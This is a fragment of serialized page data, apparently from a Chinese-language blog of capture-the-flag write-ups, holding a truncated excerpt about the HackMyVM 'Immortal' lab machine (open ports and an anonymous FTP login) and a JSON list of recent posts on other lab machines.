https://hackmyvm.eu/machines/machine.php?vm=Immortal Notes: Are you ready to become immortal? 信息收集 渗透 优先级 21 80 21 FTP 尝试使用匿名帐户登录，成功登录 存在mes..."},"recentPosts":[{"id":"群U靶机SudoHome_sunset","title":"群U靶机 - SudoHome","date":"2025-11-23","isEncrypted":false,"year":"2025","month":"11","day":"24"},{"id":"群U靶机Yibasuo","title":"群U靶机 - Yibasuo","date":"2025-11-22","isEncrypted":false,"year":"2025","month":"11","day":"24"},{"id":"HackMyVMHunter","title":"HackMyVM - Hunter","date":"2025-11-21","isEncrypted":false,"year":"2025","month":"11","day":"21"},{"id":"HackTheBoxSeason9 - NanoCorp","title":"HackTheBox - Season9 - NanoCorp","date":"2025-11-14","isEncrypted":true,"year":"2025","month":"11","day":"14"},{"id":"HackTheBoxSeason8 - Voleur","title":"HackTheBox - Machine - Voleur","date":"2025-07-07","isEncrypted":false,"year":"2025","month":"11","day":"12"},{"id":"HackTheBoxSeason8 - RustyKey","title":"HackTheBox - Machine - RustyKey","date":"2025-06-30","isEncrypted":false,"year":"2025","month":"11","day":"12"},{"id":"HackMyVMKrustykrab","title":"HackMyVM - Krustykrab","date":"2025-04-18","isEncrypted":false,"year":"2025","month":"11","day":"12"}]},"__N_SSG":true}